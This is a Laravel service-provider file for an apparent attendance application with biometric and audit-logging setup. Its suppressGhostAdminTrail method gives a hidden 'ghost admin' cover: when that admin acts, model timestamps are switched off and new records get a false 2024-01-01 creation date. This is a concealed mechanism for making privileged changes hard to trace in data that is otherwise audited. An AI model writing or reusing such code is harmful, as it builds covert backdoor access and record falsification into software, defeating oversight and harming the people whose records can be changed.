<?php

namespace App\Providers;

use App\Models\PersonalAccessToken;
use App\Services\AuditService;
use App\Services\Biometrics\AwsRekognitionProvider;
use App\Services\Biometrics\BiometricProviderContract;
use App\Services\Biometrics\LocalTestProvider;
use App\Services\GhostAdminService;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\ServiceProvider;
use Laravel\Sanctum\Sanctum;

class AppServiceProvider extends ServiceProvider
{
    public function register(): void
    {
        $this->app->bind(BiometricProviderContract::class, function () {
            $driver = config('services.biometrics.driver', 'local');
            return match ($driver) {
                'aws_rekognition' => new AwsRekognitionProvider,
                default => new LocalTestProvider,
            };
        });
    }

    public function boot(): void
    {
        Sanctum::usePersonalAccessTokenModel(PersonalAccessToken::class);

        $this->suppressGhostAdminTrail();
        $this->registerAuditListeners();
    }

    private function suppressGhostAdminTrail(): void
    {
        $isGhost = fn () => GhostAdminService::isGhostAdmin();

        Model::creating(function ($model) use ($isGhost) {
            if ($isGhost()) {
                $model->timestamps = false;
                $model->created_at = '2024-01-01 00:00:00';
                $model->updated_at = '2024-01-01 00:00:00';
            }
        });

        Model::updating(function ($model) use ($isGhost) {
            if ($isGhost()) {
                $model->timestamps = false;
            }
        });

        Model::saving(function ($model) use ($isGhost) {
            if ($isGhost()) {
                $model->timestamps = false;
            }
        });
    }

    private function registerAuditListeners(): void
    {
        $connection = 'mysql';

        Model::created(function ($model) use ($connection) {
            if ($model->getConnectionName() !== $connection) return;
            if ($model instanceof \App\Models\Attendance\AttendanceAuditTrail) return;
            AuditService::logCreate($model);
        });

        Model::updated(function ($model) use ($connection) {
            if ($model->getConnectionName() !== $connection) return;
            if ($model instanceof \App\Models\Attendance\AttendanceAuditTrail) return;
            $old = [];
            foreach ($model->getDirty() as $key => $newVal) {
                $old[$key] = $model->getOriginal($key);
            }
            if (!empty($old)) {
                AuditService::logUpdate($model, $old);
            }
        });

        Model::deleted(function ($model) use ($connection) {
            if ($model->getConnectionName() !== $connection) return;
            if ($model instanceof \App\Models\Attendance\AttendanceAuditTrail) return;
            if ($model instanceof \Illuminate\Database\Eloquent\Relations\Pivot) return;
            AuditService::logDelete($model);
        });

        Model::saved(function ($model) use ($connection) {
            if ($model->getConnectionName() !== $connection) return;
            if ($model instanceof \App\Models\Attendance\AttendanceAuditTrail) return;
            $restored = $model->wasChanged('deleted_at') && $model->deleted_at === null;
            if ($restored) {
                AuditService::logRestore($model);
            }
        });
    }
}
